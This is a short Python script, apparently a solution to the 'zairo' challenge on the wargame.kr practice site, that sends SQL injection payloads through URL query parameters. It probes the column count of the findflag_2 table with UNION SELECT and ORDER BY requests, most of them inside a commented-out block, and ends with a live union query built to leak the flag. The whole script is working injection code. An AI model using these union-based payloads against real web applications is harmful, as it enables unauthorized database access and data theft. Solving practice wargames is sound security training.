from requests import *
from urllib import parse
'''
url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select 1'
#findflag_2 테이블 속성 갯수 및 id 속성의 순서
for i in range(1,10):
    if i != 1:
        url+=f',{i}'
    url2=url+'%23'
    response=get(url=url2)
    if response.text.find('Hello') != -1:
        print('findflag_2의 속성 갯수:',i)
        print(response.text)

url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' or 1 order by 5 %23'
response=get(url=url)
print(response.text)

url='http://wargame.kr:8080/zairo?pw=,3,4,5 %23&flag=abs&id=\' union select 1,'
response=get(url=url)
print(response.text)

url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select 1,xvvcPw4coaa1sslfe,3,4,5 from findflag_2 %23'
response=get(url=url)
print(response.text)
'''
url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' union select * from findflag_2 union select 1,2,3,\'n\',5 order by 4 asc %23'  
response=get(url=url)
print(response.text)